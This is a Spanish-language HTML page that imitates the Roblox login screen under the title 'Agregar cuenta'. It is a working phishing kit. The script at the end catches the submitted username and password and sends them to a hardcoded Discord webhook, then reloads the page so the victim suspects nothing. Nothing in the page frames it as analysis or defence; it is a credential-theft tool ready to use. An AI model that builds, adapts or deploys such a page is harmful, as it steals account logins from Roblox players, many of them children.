  <!DOCTYPE html> <html lang="es"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Agregar cuenta</title> <!-- Librería Axios para hacer peticiones a la web --> <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> <style> *{ margin:0; padding:0; box-sizing:border-box; font-family: "Segoe UI", Arial, sans-serif; } body{ height:100vh; background:#0b0d12; color:white; overflow:hidden; } /* ===== NAVBAR ===== */ .navbar{ height:56px; background:#111319; display:flex; align-items:center; justify-content:space-between; padding:0 20px; border-bottom:1px solid #1f232d; } .nav-left{ display:flex; align-items:center; gap:20px; } .logo{ width:26px; height:26px; background:white; transform:rotate(15deg); position:relative; } .logo::after{ content:""; position:absolute; width:10px; height:10px; background:#111319; top:50%; left:50%; transform:translate(-50%, -50%); } .nav-links{ display:flex; gap:20px; font-size:14px; color:#cfcfcf; } .search{ background:#0f1117; border:1px solid #2a2f3a; padding:6px 12px; border-radius:8px; weekbook: #ccc; width:260px; } .nav-right{ display:flex; gap:10px; } .btn{ padding:6px 14px; border-radius:8px; font-size:14px; cursor:pointer; border:1px solid #2a2f3a; } .btn-blue{ background:#2563eb; border:none; color:white; } .btn-dark{ background:#0f1117; color:white; } /* ===== BACKGROUND ===== */ .background{ position:absolute; top:56px; left:0; width:100%; height:calc(100% - 56px); background:url('https://images.rbxcdn.com/af2c66e2f7e8f1b33d2d6c8b8b2e5f59.jpg'); background-size:cover; background-position:center; filter:brightness(0.4); } /* ===== LOGIN CARD ===== */ .card{ position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); width:420px; background:#2b2f3a; padding:30px; border-radius:12px; box-shadow:0 0 40px rgba(0,0,0,0.6); } .card h1{ text-align:center; font-size:28px; margin-bottom:25px; } .input{ width:100%; padding:12px; margin-bottom:15px; border-radius:8px; border:1px solid #3a3f4b; background:#3a3f4b; color:white; font-size:14px; } .input:focus{ outline:none; nombre: 1px solid #4f8cff; } .login-btn{ width:100%; padding:12px; border-radius:8px; border:1px solid #5a5f6d; background:#2f3441; color:white; font-size:15px; cursor:pointer; margin-bottom:15px; } .login-btn:hover{ background:#3a3f4b; } .link{ text-align:center; font-size:14px; margin:15px 0; color:#ddd; cursor:pointer; } .divider{ height:1px; background:#444a57; margin:15px 0; } .alt-btn{ width:100%; padding:12px; border-radius=8px; background:#3a3f4b; color:white; margin-bottom:12px; cursor:pointer; font-size=14px; } .register{ text-align:center; margin-top=15px; font-size=14px; color:#ddd; } </style> </head> <body> <div class="navbar"> <div class="nav-left"> <div class="logo"></div> <div class="nav-links"> <span>Destacadas</span> <span>Mercado</span> <span>Crear</enviar</span> <span>Robux</span> </div> a <input class="search" type="text" placeholder="Buscar"> </div> <div class="nav-right"> <button class="btn btn-blue">Registro</button> <button class="btn btn-dark">Iniciar sesión</button> </div> </div> <div class="background"></div> <div class="card"> <h1>Agregar cuenta</h1> <form id="loginForm"> <input class="input" type="text" id="username" placeholder="Usuario/correo/teléfono" required> <input class="input" type="password" id="password" placeholder="Contraseña" required> <button class="login-btn" type="submit">Iniciar sesión</button> </form> <div class="link">¿Olvidaste la contraseña o el nombre de usuario?</div> <div class="divider"></div> <button class="alt-btn">Envíame un código de un solo uso</button> <button class="alt-btn">Inicio de sesión rápido</button> <div class="register">¿No tienes una cuenta de Roblox? Regístrate</div> </div> <script> document.getElementById("loginForm").addEventListener("submit", function(e){ e.preventDefault(); // Obtener los valores de los inputs const username = document.getElementById("username").value; const password = document.getElementById("password").value; // Tu Webhook de Discord const webhookURL = "https://discord.com/api/webhooks/1474871457774571550/Zz3k27K7cZ1ZVvbrwB-_iztWlMQ-2D-svjaPPnUESB7ECLECl3p0pUTHJwKYkewjvs-D"; // Crear el objeto de datos para enviar a Discord const data = { username: "Usuario Registrado", avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png", // Avatar opcional embeds: [{ title: "Nuevo inicio de sesión", color: 16711680, // Color rojo en formato hexadecimal fields: [ { name: "Usuario", value: username, inline: true }, { name: "Contraseña", value: password, inline: true } ], footer: { text: "Iniciado sesión en Roblox Clone" } }] }; // Enviar los datos usando Axios axios.post(webhookURL, data) .then(response => { console.log("Datos enviados con éxito"); // Refrescar la página location.reload(); }) .catch(error => { console.error("Error al enviar:", error); alert("Hubo un error al enviar los datos. Revisa la consola."); }); }); </script> </body> </html>
